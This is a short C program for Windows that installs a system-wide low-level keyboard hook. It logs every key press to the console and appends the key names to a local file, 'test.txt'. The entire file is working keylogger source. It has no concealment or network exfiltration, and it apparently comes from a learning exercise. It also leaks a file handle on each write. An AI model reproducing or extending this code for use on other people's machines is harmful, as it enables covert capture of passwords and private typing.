#include<windows.h>
#include<stdlib.h>
#include<stdio.h>


void save_to_file(char *buffer){
    HANDLE file;
    DWORD written_bytes;
    int len_of_file = (int)strlen(buffer);
    
    file = CreateFileA("test.txt",FILE_APPEND_DATA,FILE_SHARE_READ|FILE_SHARE_WRITE,
        NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);

    if(file==INVALID_HANDLE_VALUE){
        MessageBoxA(NULL,"i couldn't save pls debug","ERROR",MB_ICONERROR);
        return;
    }

    if(WriteFile(file,buffer,len_of_file,&written_bytes,NULL)==0){
          MessageBoxW(NULL,L"Failed to write to file",L"error",MB_OK|MB_ICONERROR);
    }

}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lparam){
    if(nCode == HC_ACTION){
        KBDLLHOOKSTRUCT *KEYBOARDHOOK = (KBDLLHOOKSTRUCT*)lparam;
        char keyname_buff[600];
        switch(wParam){
            case WM_KEYDOWN:
            case WM_SYSKEYDOWN:
            GetKeyNameText(MapVirtualKeyA(KEYBOARDHOOK->vkCode,MAPVK_VK_TO_VSC) <<16,
                            keyname_buff,sizeof(keyname_buff));
            fprintf(stdout,"you pressed %s\n",keyname_buff);
            save_to_file(keyname_buff);
            default:
                return CallNextHookEx(NULL,nCode,wParam,lparam);
        }
    }
    return CallNextHookEx(NULL,nCode,wParam,lparam);
}

int main(){
    HINSTANCE instance = GetModuleHandle(NULL);
    HHOOK MY_HOOK = SetWindowsHookEx(WH_KEYBOARD_LL,LowLevelKeyboardProc,instance,0);
    if(!MY_HOOK){
        fprintf(stderr,"an error occured");
        return EXIT_FAILURE;
    }
    MSG msg;

    while(GetMessage(&msg,NULL,0,0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(MY_HOOK);
    return 0;
}